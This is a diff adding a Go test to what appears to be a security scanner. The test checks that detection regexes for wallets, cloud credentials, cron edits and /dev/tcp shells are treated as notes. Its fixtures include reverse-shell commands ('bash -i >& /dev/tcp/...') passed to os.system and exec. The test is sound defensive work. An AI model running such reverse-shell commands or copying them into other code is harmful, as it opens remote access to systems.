@@ -217,3 +217,54 @@ func TestCleanPHPAndRubyProjects(t *testing.T) {
 		t.Errorf("clean projects: %s %+v", r.Verdict, r.Findings)
 	}
 }
+
+// A scanner's own rules name the behavior they look for. Text inside a
+// regular expression is a note; the same text anywhere else on the line is not.
+func TestPatternsAreNotBehavior(t *testing.T) {
+	dir := t.TempDir()
+	write(t, dir, map[string]string{
+		"rules.go": "var r = []rule{\n" +
+			"\t{\"wallets\", High, Possible, regexp.MustCompile(`(?i)(electrum[/\\\\]wallets|wallet\\.dat\\b)`)},\n" +
+			"\t{\"cloud\", regexp.MustCompile(`\\.aws/credentials|\\.kube/config`)},\n" +
+			"\t{\"cron\", regexp.MustCompile(`\\bcrontab\\s+-|/etc/cron\\.`)},\n}\n",
+		"rules.py": "SHELL = re.compile(r\"/dev/tcp/[\\w.-]+/\\d+\")\n",
+		"rules.js": "const shell = new RegExp(\"/dev/tcp/1.2.3.4/1\");\n",
+	})
+	r, err := Scan(context.Background(), dir, DefaultLimits)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if r.Verdict != NoIndicators || r.Score < 90 || len(r.Findings) == 0 {
+		t.Errorf("rule definitions: %s %d %+v", r.Verdict, r.Score, r.Findings)
+	}
+	for _, f := range r.Findings {
+		if !note(f) || !strings.HasPrefix(f.Why, "Inside a regular expression") {
+			t.Errorf("not a pattern note: %+v", f)
+		}
+	}
+
+	dir = t.TempDir()
+	write(t, dir, map[string]string{
+		// The pattern comes first, the behavior after it.
+		"a.py": "p = re.compile(\"x\"); os.system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")\n",
+		// One match inside a pattern, one outside.
+		"b.js": "new RegExp('/dev/tcp/a/1'); exec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')\n",
+		// An escaped quote does not end the literal early, nor hide what follows it.
+		"c.js": "new RegExp(\"a\\\"b\"), exec(\"/dev/tcp/10.0.0.1/4444\")\n",
+	})
+	r, err = Scan(context.Background(), dir, DefaultLimits)
+	if err != nil {
+		t.Fatal(err)
+	}
+	high := map[string]bool{}
+	for _, f := range r.Findings {
+		if f.Rule == "safety.reverse-shell" && f.Severity == High {
+			high[f.Path] = true
+		}
+	}
+	for _, p := range []string{"a.py", "b.js", "c.js"} {
+		if !high[p] {
+			t.Errorf("%s: behavior beside a pattern was softened: %+v", p, r.Findings)
+		}
+	}
+}
